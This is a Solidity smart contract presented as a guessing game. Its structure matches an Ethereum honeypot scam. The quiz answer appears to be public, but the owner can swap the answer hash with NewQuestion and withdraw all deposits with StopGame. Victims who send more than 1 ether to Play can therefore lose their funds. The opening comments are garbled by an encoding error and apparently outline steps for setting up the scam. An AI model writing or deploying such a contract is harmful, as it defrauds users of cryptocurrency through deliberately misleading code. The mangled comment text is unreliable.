// 1. ������ݧߧڧ�� StartGame �� �ܧ�ߧ��ѧܧ�� �� ���ҧݧڧ�ߧ�ާ� �էѧߧߧ�ާ�
// 2. ������ݧߧڧ�� NewQuestion �� �ܧ�ߧ��ѧܧ��
// 3. ���ҧ֧էڧ��� ��֧�֧� web3 ���� ���� ���ާ֧ߧ�ݧ��
// 4. �� ��ѧ�ѧާ֧���ѧާ� ��1. ������ݧߧڧ�� �ܧ�ާާѧߧէ� StartGame �� ���ҧݧڧ�ߧ�ԧ� �ѧܧܧѧ�ߧ��

pragma solidity ^0.4.20;

contract GUESS_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    string public question;
 
    address questionSender;
  
    bytes32 responseHash;
 
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    
    function() public payable{}
}